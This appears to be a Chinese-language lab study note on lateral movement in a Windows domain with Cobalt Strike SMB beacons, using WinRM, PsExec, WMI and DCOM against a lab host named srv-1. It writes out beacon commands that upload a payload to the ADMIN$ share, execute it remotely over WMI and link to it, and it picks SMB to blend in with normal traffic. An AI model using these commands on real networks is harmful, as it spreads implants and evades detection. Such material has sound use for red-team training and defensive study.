这里的横向都使用smb的p2p beacon，因为smb普遍安装在windows，可以伪装成正常流量

# PowerShell Remoting

当前账号，枚举将要横向的目标计算机的架构

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659217567944.png)

使用```winrm64```横向到```srv-1```，使用smb监听器

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659217648208.png)

使用```winrm```横向到```srv-1```，使用smb监听器

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659217760830.png)

# PsExec

使用```psexec64```横向到```srv-1```，使用smb监听器

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659217855448.png)

使用```psexec```横向到```srv-1```，使用smb监听器

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659217912569.png)

使用```psexec_psh```横向到```srv-1```，使用smb监听器

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659217968185.png)

# Windows Management Instrumentation (WMI)

1. 使用WMI横向，首先要生成一个SMB的p2p beacon,然后上传到目标靶机
```
beacon> cd \\srv-1\ADMIN$
beacon> upload C:\Payloads\beacon-smb.exe
```

2. 使用```remote-exec```命令，远程执行beacon-smb.exe
```
remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
```

3. 连接目标靶机上的smb beacon
```
link srv-1
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659218159039.png)

# DCOM

这个方法跟WMI差不多：1，生成beacon，上传到靶机。2，远程执行。3，连接。

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659218634868.png)